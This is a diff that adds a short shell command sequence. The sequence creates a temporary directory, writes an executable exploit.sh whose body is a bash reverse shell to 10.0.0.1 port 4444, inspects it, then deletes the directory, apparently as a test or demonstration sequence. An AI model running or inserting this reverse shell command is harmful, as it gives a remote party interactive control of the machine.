@@ -1,0 +1,14 @@
+mkdir /tmp/tools
+ls /tmp
+cd /tmp/tools
+pwd
+touch exploit.sh
+ls -la
+echo "#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1" > exploit.sh
+cat exploit.sh
+chmod +x exploit.sh
+ls -la exploit.sh
+cd ..
+ls /tmp/tools
+rm -rf /tmp/tools
+ls /tmp
